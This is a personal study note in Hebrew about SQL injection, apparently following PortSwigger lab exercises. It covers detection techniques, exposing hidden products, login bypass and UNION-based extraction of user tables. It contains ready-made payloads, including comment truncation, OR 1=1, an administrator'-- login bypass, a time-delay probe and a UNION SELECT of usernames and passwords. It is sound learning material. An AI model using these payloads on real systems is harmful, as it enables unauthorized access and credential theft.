הזרקת SQL זאת פגיעת אבטחה המאפשרת לתקוף להפריע לדרך שהאפלקציה עובדת זה יכול לאפשר לתוקף לצפות בנתונים שבדרך כלל לא היה לו גישה, שזה יכול להיות נתונים של משתמשים אחרים או כל דבר שהאפלקציה יכולה לגשת אליהם. במקרים רבים התוקף יכול למחוק את הנתונים האלה ולגרום לשנינויים בתוכן או בהתנהגות של האפלקציה .

How to detect SQL injection vulnerabilities: #How-to-detect-SQL-injection-vulnerabilities
איך נזהה חולשות הזרקת SQL אז ניתן לזהות חולשות כאלה בואפן ידני באמצאות קבוצה שיטיתית של בדיקות על כל נקודות כניסה (entry  point) לעשות זאת נעשה בדרך כזאת בדרך כלל,
1. קלט שנתשמש ב' (גרשיים) כדאי לסגור את המחרוזת אם האתר מחזיר שגיאה = פגיע .
2. שליחת משהו שמתמטית נכון ועם התוצאה זהה זה אומר שהוא מריץ את זה.
למשל: יובל'-- ואז לשנות ליובל'\* אם התוצאה זהה זה אומר שאתר מריץ את הקוד שלנו
3. תנאים בוליאניים (Boolean conditions) 
למשל: OR 1=1 ← תמיד נכון = מחזיר הכל
ס OR 1=2 ← תמיד שקר = מחזיר כלום.
4. פקודות דילי(Time delays) הכנסת פקודה שגורמת לשרת לחכות
למשל: `'; WAITFOR DELAY '0:0:5'--
5. אוסט (OAST) הכי מתקדם — גורם לשרת לשלוח בקשה לשרת שלך מבחוץ. מוכיח injection גם כשאין שום תגובה נראית.

Retrieving hidden data: #Retrieving-hidden-data
אחזור נתונים מוסתרים (Retrieving hidden data) 

האתר מריץ query כזאת:
SELECT * FROM products WHERE category = 'Gifts' AND released = 1

* = כל העמודות
released = 1 = מוצרים שיצאו לשוק
released = 0 = מוצרים מוסתרים שעדיין לא יצאו


התקפה 1 - הסרת תנאי עם comment (--)
category=Gifts'--

ה query נהיית:
SELECT * FROM products WHERE category = 'Gifts'
-- מבטל את כל מה שאחריו = AND released = 1 נעלם
תוצאה: מציג גם מוצרים מוסתרים


התקפה 2 - הצגת הכל עם OR 1=1
category=Gifts'+OR+1=1--

ה query נהיית:
SELECT * FROM products WHERE category = 'Gifts' OR 1=1
1=1 תמיד נכון = מחזיר את כל המוצרים מכל ה categories



⚠️ אזהרה:
OR 1=1 על UPDATE או DELETE = מחיקת כל הנתונים בטבלה
תזהר איפה משתמשים בזה

[[Lab SQL injection vulnerability in WHERE clause allowing retrieval of hidden data]]


**Subverting application logic**: #-Subverting-application-logic
חתירה תחת לוגיקת היישום (Subverting application logic) 

האתר מריץ query כזאת בlogin:
SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'

אם ה query מחזיר משתמש = login מצליח


התקפה - עקיפת סיסמה עם --
username: administrator'--
password: (ריק)

ה query נהיית:
SELECT * FROM users WHERE username = 'administrator'--' AND password = ''

-- מבטל את AND password = ''
תוצאה: נכנסים כ administrator בלי סיסמה


(את זה עשיתי עם קלוד את הסיכום  לא היה לי כוח לרשום סליחה חחחח (1 בלילה))
[[Lab SQL injection vulnerability allowing login bypass]]

## Retrieving data from other database tables: #Retrieving-data-from-other-database-tables

במקרה שהאפלקציה עונה עם תשובות של SQL query התוקף יכול להזריק SQL כדאי לקבל נתונים מטבלאות אחרות בתוך database א‏פשר להשתמש ב `UNION` כדאי להריץ `SELECT`  query ולהוסיף את התשובות לquery המקורי.
למשל  אם האפלקציה מבצעת query שמכיל קלט של משתמש Gifts זה הראה ככה :
`SELECT name, description FROM products WHERE category = 'Gifts'
והתוקף יכול להכניס בקלט ככה:
`' UNION SELECT username, password FROM users--`
שזה גורם לאפלקציה להחזיר את על המשתמשים וסיסמה עם השם ותיאור של המוצרים.
[[UNION attacks]] עוד ב 